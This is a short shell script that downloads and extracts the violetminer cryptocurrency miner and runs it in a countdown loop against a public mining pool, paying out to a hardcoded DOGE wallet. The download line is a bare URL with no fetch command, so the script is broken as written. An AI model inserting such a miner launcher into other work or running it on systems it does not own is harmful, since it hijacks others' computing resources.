#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz
tar -xf violetminer-linux-v0.2.2.tar.gz
cd violetminer-linux-v0.2.2 

./violetminer --pool rx.unmineable.com:3333 --username DOGE:DLhGiaLWo6ueACdCtg9tEtjPtZd8AY9guz.saurus14#5lwq-sr9m --password x --algorithm wrkzcoin -t1



     echo COUNTER $COUNTER
     let COUNTER-=1
done
